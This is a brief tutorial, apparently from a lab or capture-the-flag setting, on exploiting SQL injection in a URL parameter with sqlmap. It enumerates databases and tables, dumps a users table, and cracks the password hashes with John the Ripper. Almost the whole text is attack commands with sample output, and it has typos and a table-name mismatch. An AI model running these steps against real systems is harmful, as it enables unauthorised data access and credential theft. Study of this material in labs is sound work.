If you ahve a URL like the below example:
```
http://10.50.10.139/?nid=1
```

Try running sqlmap to see if you can get any vulnerabilities:
```
sqlmap -u 'http://10.50.10.139/?nid=1'
```

If you find any vulnerabilities, try to do some enumeration:
```
sqlmap -u 'http://10.50.10.139/?nid=1' --dbs
```

In the above example it returned with MySQL DB schema on possibel databases.
Example output:
```
available databases [2]:
[*] d7db
[*] information_schema
```

Now let's have a look at the tables for database d7db:
```
sqlmap -u 'http://10.50.10.139/?nid=1' -D d7db --tables
```

Now lets the dump the table "users" from the database d7db
```
sqlmap -u 'http://10.50.10.139/?nid=1' -D d7db -T user --dump
```

You can now copy the username and passwords to a text file and run john the ripper to crack it
```
john users.has --wordlist=/usr/share/wordlists/rockyou.txt
```

